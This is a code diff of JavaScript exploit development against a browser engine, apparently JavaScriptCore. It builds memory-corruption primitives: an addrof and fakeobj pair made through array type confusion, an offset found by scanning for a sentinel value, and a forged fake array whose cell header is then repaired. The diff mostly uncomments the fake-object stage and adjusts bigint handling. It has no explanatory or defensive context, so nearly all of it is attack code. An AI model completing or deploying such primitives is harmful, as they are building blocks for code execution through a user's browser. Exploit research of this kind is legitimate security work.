@@ -47,7 +47,6 @@ var qwordAsFloat = qword => {
           }
           function bigint2float(v,set) {
             if(set) {
-            
             u[0] = Number(v & 0xffffffff)
             u[1] = Number(v >> 32);
             return f[0]
@@ -56,43 +55,35 @@ var qwordAsFloat = qword => {
             u[1] = Number(v >> 32n);
             return f[0];
           }
-
           // store things to prevent GC
           let keep = [];
           function gc(n=10000) {
             let tmp = [];
             for (var i = 0; i < n; i++) tmp.push(new Uint8Array(10000));
           }
-
           // message port to talk to main thread; will be set later
           let port = null;
-
           // will be implemented later
           let fakeobj = null;
           let addrof = null;
-
           for (var i = 0; i < 100; i++) keep.push([1.1*i]);
-          let a0 = [0,0,0,0,0,0,0,0,0,0]; //
-          let a1 = [0,0,0,0,0,0,0,0,0,0]; //target
+          let a0 = [0,0,0,0,0,0,0,0,0,0];
+          let a1 = [0,0,0,0,0,0,0,0,0,0];
           // transition to unboxed double storage
           a1[3] = 13.37;
           let b0 = [0,0,0,0,0,0,0,0,0,0];
-          let b1 = [0,0,a1,a1,0,0,0,0,0,0]; //float // store references to a1 to make b1 a boxed array
-
+          let b1 = [0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array
           // put zeroes in first two slots so JSCallbackData destruction is safe
           delete b1[0];
           delete b1[1];
-
           function setupPrimitives() {
             port.postMessage("setting up");
             if (a1.length != 0x1337) {
               port.postMessage("Failure on array length");
               return;
             }
-
             const kSentinel = 1333.337;
             let offset = -1;
-
             b1[0] = kSentinel;
             // scan for the sentinel to find the offset from a to b
             for (var i = 0; i < 0x100; i++) {
@@ -105,16 +96,12 @@ var qwordAsFloat = qword => {
               port.postMessage("Failure finding offset");
               return;
             }
-
             // temporary implementations
             addrof = (val) => {
               b1[0] = val;
               return parseInt(float2bigint(a1[offset],true),16);
-              //return float2bigint(a1[offset]);
             }
-            
             fakeobj = (addr) => {
-              //port.postMessage
               a1[offset] = bigint2float(addr);
               return b1[0];
             }
@@ -123,13 +110,12 @@ var qwordAsFloat = qword => {
               fakeButterfly: a0
             };
             let addr = addrof(obj);
-            port.postMessage("obj @ " + addr);
-            port.postMessage(typeof(addr) +"vs"+typeof(0x10n))
+            port.postMessage("obj @ " + addr.toString());
+            port.postMessage(typeof(addr) +"vs"+typeof(0x10))
            
-            /*let fakeArr = fakeobj(addr + 0x10); //no way around this im forced to use bigint for fakeobj :(
-            port.postMessage("hey");
+            let fakeArr = fakeobj(addr + 0x10); //no way around this im forced to use bigint for fakeobj :(
             // subtract off the incref
-            doubleArrayCellHeader = float2bigint(fakeArr[0],true) - 0x1;
+            doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
             port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
             // fix broken cell header
             fakeArr[0] = bigint2float(doubleArrayCellHeader);
@@ -151,7 +137,7 @@ var qwordAsFloat = qword => {
             addrof = (val) => {
               b1[0] = val;
               return float2bigint(a1[0]);
-            }*/
+            }
             port.postMessage("We got stableish addrof and fakeobj");
           }
           
